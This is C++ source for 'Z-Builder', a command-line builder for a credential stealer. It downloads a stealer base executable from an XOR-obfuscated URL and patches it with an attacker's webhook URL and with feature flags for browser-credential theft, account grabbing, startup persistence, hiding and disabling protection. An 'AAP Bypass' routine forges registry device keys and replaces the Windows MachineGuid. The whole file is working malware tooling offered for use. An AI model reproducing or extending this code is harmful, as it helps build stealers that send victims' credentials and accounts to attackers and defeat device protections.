#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <string>
#include <iostream>
#include <Wininet.h>
#include <iterator>
#include <string>
#include <algorithm>
#include <vector>
#include <fstream>
#include <sstream>
#include "XorString.h"
#include <stdexcept>
#include <sstream>
#include <iomanip>
#include <string>
#include <cstdint>
#include "registry.h"
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")
#define XorString( String ) ( CXorString<ConstructIndexList<sizeof( String ) - 1>::Result>( String ).decrypt() )

using namespace std;

string GetHWID();
string DownloadString(string URL);
string decrypt(string str);
bool VerifyLicense(string License);
int DownloadFile(string url, string path);
string decrypt2(string toEncrypt);

//AAP Bypass
std::wstring s2ws(const std::string& s) {
	return std::wstring(s.begin(), s.end());
}

std::string RandomKey(int length, int table = 0)
{
	std::string buffer = "";
	static const char alphanum0[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";
	static const char alphanum1[] =
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";
	static const char alphanum2[] =
		"0123456789";
	static const char alphanum3[] =
		"0123456789abdef";

	switch (table) {
	case 1: for (int i = 0; i < length; i++) buffer += alphanum1[rand() % (sizeof(alphanum1) - 1)]; break;
	case 2: for (int i = 0; i < length; i++) buffer += alphanum2[rand() % (sizeof(alphanum2) - 1)]; break;
	case 3: for (int i = 0; i < length; i++) buffer += alphanum3[rand() % (sizeof(alphanum3) - 1)]; break;
	default: for (int i = 0; i < length; i++) buffer += alphanum0[rand() % (sizeof(alphanum0) - 1)]; break;
	}
	return buffer;
}

int Multiply(int number, int times) {
	int result = 1;
	for (int i = 0; i < times; i++) result = result * number;
	return result;
}

int HexCharToInt(char HexChar) {
	std::string chars = "0123456789abcdefABCDEF";
	size_t posX = chars.find(HexChar);
	return posX == std::string::npos ? 0 : (posX > 15 ? posX - 6 : posX);
}

std::string IntToHex(int INT) {
	std::stringstream stream;
	stream << std::hex << INT;
	return std::string(stream.str());
}

std::pair<std::string, std::string> MACToKeys(std::string MAC) {
	std::string Rkeya = "", Rkeyb = "";
	if (MAC.length() != 12) return { "", "" };
	unsigned char values[18];
	for (int i = 0; i < 17; i++) values[i] = 238 + i;
	values[17] = 0;
	int id = 0;
	int hex;
	for (int i = 0; i < 17; i++) {
		if (i % 3 == 2) {
			values[i] += 10;
			continue;
		}
		if ((hex = HexCharToInt(MAC[id])) < 10) values[i] += hex;
		else values[i] -= (217 - hex);
		id++;
	}

	std::string result = "";
	for (int i = 0; i < 18; i++) {
		std::string addi = IntToHex((unsigned char)values[i]);
		result += addi.length() % 2 == 1 ? '0' + addi : addi;
	}
	Rkeya = result;


	int sum = 0;
	for (int i = 0; i < 18; i++) if (i % 3 != 2) sum += values[i];

	int altems[6] = { 4, 3, 7, 6, 4, 4 };
	int offsets[12] = { -1, -1, -1, -1, -1, -1, 8, 7, 5, 4, 2, 1 };

	for (int i = 0; i < (int)MAC.length(); i++) {
		int mass = HexCharToInt(MAC[i]);
		if (mass == 0) continue;
		if (mass >= 10) {
			altems[5] += mass - 7;
			altems[4] -= 1;
			altems[3] -= 2;
		}
		else if (offsets[i] != -1 && mass > offsets[i]) {
			altems[5] += mass - 6;
			altems[4] -= 5;
			altems[3] -= 2;
		}
		else altems[5] += mass;
	}

	int val = 0;
	for (int i = 5; i >= 0; i--) val += (altems[i] * (Multiply(10, 5 - i)));
	for (int i = 5; i > 0; i--) {
		altems[i] = val % 10;
		val -= val % 10;
		val /= 10;
	}
	altems[0] = val;

	char spacer = '3';
	std::string HASH2 = "";

	for (int i = 0; i < 6; i++) HASH2 += spacer + std::to_string(altems[i]);
	HASH2 += "00";
	Rkeyb = HASH2;
	return { Rkeya, Rkeyb };
}

std::string findMKey() {
	std::wstring key = L"";
	HKEY HK = NULL;
	if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft", 0, KEY_READ | KEY_WOW64_32KEY, &HK) == ERROR_SUCCESS) {
		key = FindKey(HK, L"", true);
		RegCloseKey(HK);
	}
	if (!key.length() && RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft", 0, KEY_READ | KEY_WOW64_64KEY, &HK) == ERROR_SUCCESS) {
		key = FindKey(HK, L"", true);
		RegCloseKey(HK);
	}
	if (!key.length()) return "N/A";
	string stringKey(key.begin(), key.end());
	return stringKey;
}

void setRegKeys(std::wstring aKey, std::wstring aValue1, std::wstring aValue2, std::pair<std::string, std::string> keys, std::string MKey) {
	if (!RegKeySetValueBinary(HKEY_CURRENT_USER, aKey, aValue1, keys.first) ||
		!RegKeySetValueBinary(HKEY_CURRENT_USER, aKey, aValue2, keys.second)) {
		cout << "Inserting device keys failed!";
		return;
	}
	std::string Rguid = RandomKey(36, 3);
	Rguid[8] = '-'; Rguid[13] = '-'; Rguid[18] = '-'; Rguid[23] = '-';
	RegKeySetValueRegSz(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography", L"MachineGuid", s2ws(Rguid));
	try
	{
		RegDeleteKey(HKEY_CURRENT_USER, std::wstring(L"Software\\Microsoft\\" + s2ws(MKey)).c_str());
	}
	catch (...)
	{
	}
}
//AAP Bypass
// command syntax: [ID]==[WebHook_URL]==[Path]==[AAP-Data]==[Tracer:(Y/N)]--[Recover:(Y/N)]--[GetAllAccs:(Y/N)]--[DeleteGT:(Y/N)]--[StartUp:(Y/N)]--[HideStealer:(Y/N)]==[Title]==[Message]==[AAP Bypass]==
// ID has to be 8 chars
// ID has to be combined with HWID. Example: [ID{HWID}]

std::string ReplaceAll(std::string str, const std::string& from, const std::string& to) {
	size_t start_pos = 0;
	while ((start_pos = str.find(from, start_pos)) != std::string::npos) {
		str.replace(start_pos, from.length(), to);
		start_pos += to.length(); // Handles case where 'to' is a substring of 'from'
	}
	return str;
}

std::string string_to_hex(const std::string& in) {
	std::stringstream ss;

	ss << std::hex << std::setfill('0');
	for (size_t i = 0; in.length() > i; ++i) {
		ss << std::setw(2) << static_cast<unsigned int>(static_cast<unsigned char>(in[i]));
	}

	return ss.str();
}

std::string hex_to_string(const std::string& in) {
	std::string output;

	if ((in.length() % 2) != 0) {
		throw std::runtime_error("String is not valid length ...");
	}

	size_t cnt = in.length() / 2;

	for (size_t i = 0; cnt > i; ++i) {
		uint32_t s = 0;
		std::stringstream ss;
		ss << std::hex << in.substr(i * 2, 2);
		ss >> s;

		output.push_back(static_cast<unsigned char>(s));
	}

	return output;
}

int main(int argc, char* argv[])
{
	std::vector<string> CMDParts;
	string command;
	if (argc >= 2)
	{
		command = argv[argc - 1];
	}
	else
	{
		cout << "Command line interface for Z-Builder\n=============================================\n(Do not use if you have no idea what this is)\n\n";
		cout << "Command: ";
		cin >> command;
	}
	command = ReplaceAll(command, "[SPACE]", " ");
	string HWID = GetHWID();
	string cmdSplitter = "==";
	if (command.find(cmdSplitter) != string::npos)
	{
		try
		{
			while (command.find(cmdSplitter) != string::npos)
			{
				size_t cmdSplitterLocation = command.find(cmdSplitter);
				string aCommand = command.substr(0, cmdSplitterLocation);
				CMDParts.push_back(aCommand);
				command.erase(0, cmdSplitterLocation + 2);
			}
		}
		catch (...)
		{
			cout << "Invalid syntax!";
			return 0;
		}
	}
	if (CMDParts.size() == 6)
	{
		if (true)
		{
			string UnencryptedWebHook = CMDParts[0];
			string RemovedBracketsWB = UnencryptedWebHook.substr(1, UnencryptedWebHook.size() - 2);
			string WebHook = string_to_hex(decrypt2(RemovedBracketsWB));
			string tempPath = getenv("TEMP");
			string StealerBase = tempPath + "\\StealerBase.exe";
			DownloadFile(DownloadString(decrypt2("21$8*h//*$#<<0int&?%v awu&ey*99Q2")), StealerBase);
			ifstream MyFile(StealerBase, std::ios::binary);
			string AllBytes = string((istreambuf_iterator<char>(MyFile)),
				(istreambuf_iterator<char>()));
			string DummyText = XorStr("[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]");
			size_t DummyTextLocation = AllBytes.find(DummyText);
			AllBytes.replace(DummyTextLocation, WebHook.length(), WebHook);
			string RawLocation = CMDParts[1];
			string Features = CMDParts[2];
			string DummyFeatures = decrypt(XorStr("[DisableProt:(N)]--[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]"));
			size_t DummyFeaturesLocation = AllBytes.find(DummyFeatures);
			AllBytes.replace(DummyFeaturesLocation, DummyFeatures.length(), decrypt(Features));
			string Location = RawLocation.substr(1, RawLocation.size() - 2);

			//Message Box
			string MessageTitle = CMDParts[3];
			MessageTitle = MessageTitle.substr(1, MessageTitle.size() - 2);
			string DummyTitle = "+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-";
			size_t DummyTitleLocation = AllBytes.find(DummyTitle);
			AllBytes.replace(DummyTitleLocation, MessageTitle.length(), MessageTitle);
			string Message = CMDParts[4];
			Message = Message.substr(1, Message.size() - 2);
			string DummyMessage = "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-";
			size_t DummyMessageLocation = AllBytes.find(DummyMessage);
			AllBytes.replace(DummyMessageLocation, Message.length(), Message);
			// Message Box - End

			// AAP
			string AAPData = CMDParts[5];
			string DummyAAP = "#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$";
			size_t DummyAAPLocation = AllBytes.find(DummyAAP);
			AllBytes.replace(DummyAAPLocation, AAPData.length(), AAPData);
			// AAP
			ofstream WriteFile(Location, std::ofstream::trunc | std::ios::binary);
			WriteFile << AllBytes;
			remove(StealerBase.c_str());
		}
		else
		{
			cout << "Invalid license";
		}
		return 0;
	}
	else if (CMDParts.size() == 1)
	{
		//AAP Bypass
		//MAC = [5EA1925815E4]==
		string RawMAC = CMDParts[0];
		RawMAC = RawMAC.substr(1, RawMAC.size() - 2);
		RawMAC.erase(std::remove(RawMAC.begin(), RawMAC.end(), '-'), RawMAC.end());
		string MACAddress = RawMAC;
		std::wstring data = FindKey(HKEY_CURRENT_USER, L"", true);
		std::vector<std::wstring> values = FindKeyAll(HKEY_CURRENT_USER, data, false);
		wstring wvalue1 = values[0];
		wstring wvalue2 = values[1];
		string MKey = findMKey();
		setRegKeys(data, wvalue1, wvalue2, MACToKeys(MACAddress), MKey);
	}
	else if (CMDParts.size() == 2)
	{
		// AAP Gen
		// [RegString]==[Path]==
		string RawReg = CMDParts[0];
		RawReg = RawReg.substr(1, RawReg.size() - 2);
		RawReg = decrypt(RawReg);
		string RegString = hex_to_string(RawReg);
		string RawPath = CMDParts[1];
		string Path = RawPath.substr(1, RawPath.size() - 2);
		ofstream WriteRegFile(Path, std::ios::binary);
		WriteRegFile << RegString;
		WriteRegFile.close();
	}
	else
	{
		cout << "Invalid syntax!";
	}
}


// Check license
bool VerifyLicense(string License)
{
	std::vector<string> allLicenses;
	string rawLicenseData = DownloadString(decrypt2("21$8*h//*$#<<0int&?%v awu}ax+uU"));
	rawLicenseData.erase(remove(rawLicenseData.begin(), rawLicenseData.end(), '\r'), rawLicenseData.end());
	rawLicenseData.erase(remove(rawLicenseData.begin(), rawLicenseData.end(), '\n'), rawLicenseData.end());
	while (rawLicenseData.find("]") != string::npos)
	{
		size_t Splitter = rawLicenseData.find("]");
		string aLicense = rawLicenseData.substr(0, Splitter + 1);
		allLicenses.push_back(aLicense);
		rawLicenseData.erase(0, Splitter + 1);
	}
	if (std::find(allLicenses.begin(), allLicenses.end(), License) != allLicenses.end())
	{
		return true;
	}
	else
	{
		return false;
	}
}

// Check license - End

// Download File
size_t write_data(void* ptr, size_t size, size_t nmemb, FILE* stream)
{
	size_t written;
	written = fwrite(ptr, size, nmemb, stream);
	return written;
}

int DownloadFile(string url, string path)
{
	HRESULT hr;
	wstring Wurl;
	Wurl.assign(url.begin(), url.end());
	wstring Wpath;
	Wpath.assign(path.begin(), path.end());
	LPCTSTR Url = Wurl.c_str(), File = Wpath.c_str();
	hr = URLDownloadToFile(0, Url, File, 0, 0);
	return 0;
}
// Download File - End

// Get HWID
string GetHWID()
{
	std::string m_sResult;
	HANDLE m_hFile = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (m_hFile == INVALID_HANDLE_VALUE)
		return { };

	std::unique_ptr< std::remove_pointer <HANDLE >::type, void(*)(HANDLE) > m_hDevice
	{
		m_hFile, [](HANDLE handle)
		{
			CloseHandle(handle);
		}
	};

	STORAGE_PROPERTY_QUERY m_PropertyQuery;
	m_PropertyQuery.PropertyId = StorageDeviceProperty;
	m_PropertyQuery.QueryType = PropertyStandardQuery;

	STORAGE_DESCRIPTOR_HEADER m_DescHeader;
	DWORD m_dwBytesReturned = 0;
	if (!DeviceIoControl(m_hDevice.get(), IOCTL_STORAGE_QUERY_PROPERTY, &m_PropertyQuery, sizeof(STORAGE_PROPERTY_QUERY),
		&m_DescHeader, sizeof(STORAGE_DESCRIPTOR_HEADER), &m_dwBytesReturned, NULL))
		return { };

	const DWORD m_dwOutBufferSize = m_DescHeader.Size;
	std::unique_ptr< BYTE[] > m_pOutBuffer{ new BYTE[m_dwOutBufferSize] { } };

	if (!DeviceIoControl(m_hDevice.get(), IOCTL_STORAGE_QUERY_PROPERTY, &m_PropertyQuery, sizeof(STORAGE_PROPERTY_QUERY),
		m_pOutBuffer.get(), m_dwOutBufferSize, &m_dwBytesReturned, NULL))
		return { };

	STORAGE_DEVICE_DESCRIPTOR* m_pDeviceDescriptor = reinterpret_cast<STORAGE_DEVICE_DESCRIPTOR*>(m_pOutBuffer.get());
	const DWORD m_dwSerialNumberOffset = m_pDeviceDescriptor->SerialNumberOffset;
	if (m_dwSerialNumberOffset == 0)
		return { };

	m_sResult = reinterpret_cast<const char*>(m_pOutBuffer.get() + m_dwSerialNumberOffset);
	m_sResult.erase(std::remove_if(m_sResult.begin(), m_sResult.end(), std::isspace), m_sResult.end());

	if (m_sResult.size() != 8)
	{
		if (m_sResult.size() > 8)
		{
			m_sResult = m_sResult.substr(m_sResult.size() - 8);
		}
		if (m_sResult.size() < 8)
		{
			while (m_sResult.size() != 8)
			{
				m_sResult = m_sResult + "0";
			}
		}
	}
	return m_sResult;
}
// Get HWID - End

// Download string
string replaceAll(string subject, const string& search,
	const string& replace) {
	size_t pos = 0;
	while ((pos = subject.find(search, pos)) != string::npos) {
		subject.replace(pos, search.length(), replace);
		pos += replace.length();
	}
	return subject;
}

string DownloadString(string URL) {
	HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	HINTERNET urlFile;
	string rtn;
	if (interwebs) {
		urlFile = InternetOpenUrlA(interwebs, URL.c_str(), NULL, NULL, NULL, NULL);
		if (urlFile) {
			char buffer[2000];
			DWORD bytesRead;
			do {
				InternetReadFile(urlFile, buffer, 2000, &bytesRead);
				rtn.append(buffer, bytesRead);
				memset(buffer, 0, 2000);
			} while (bytesRead);
			InternetCloseHandle(interwebs);
			InternetCloseHandle(urlFile);
			string p = replaceAll(rtn, "|n", "\r\n");
			return p;
		}
	}
	InternetCloseHandle(interwebs);
	string p = replaceAll(rtn, "|n", "\r\n");
	return p;
}
// Download string end

// Decrypt strings
string decrypt(string str)
{
	string temp = str;
	int length;

	length = (int)temp.length();

	for (int i = 0; i < length; i++)
	{
		if (isalpha(temp[i]))
		{
			for (int j = 0; j < 13; j++)
			{
				if (temp[i] == 'z')
				{
					temp[i] = 'a';
				}
				else if (temp[i] == 'Z')
				{
					temp[i] = 'A';
				}
				else
				{
					temp[i]++;
				}
			}
		}
	}

	return temp;
}

string decrypt2(string toEncrypt) {
	char key[8] = { 'Z', 'E', 'P', 'H', 'Y', 'R' }; //Any chars will work
	string output = toEncrypt;

	for (int i = 0; i < toEncrypt.size(); i++)
		output[i] = toEncrypt[i] ^ key[i % (sizeof(key) / sizeof(char))];

	return output;
}
// Decrypt strings - End